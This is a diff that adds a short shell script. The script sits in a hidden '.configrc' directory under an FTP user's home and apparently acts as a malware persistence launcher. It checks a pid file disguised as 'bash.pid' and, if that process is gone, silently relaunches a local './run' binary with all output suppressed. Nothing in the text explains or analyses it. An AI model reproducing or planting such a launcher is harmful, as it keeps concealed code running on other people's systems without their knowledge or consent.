@@ -1,0 +1,10 @@
+#!/bin/sh
+cd /home/ftp_user/.configrc/a
+if test -r /home/ftp_user/.configrc/a/bash.pid; then
+pid=$(cat /home/ftp_user/.configrc/a/bash.pid)
+if $(kill -CHLD $pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+./run &>/dev/null
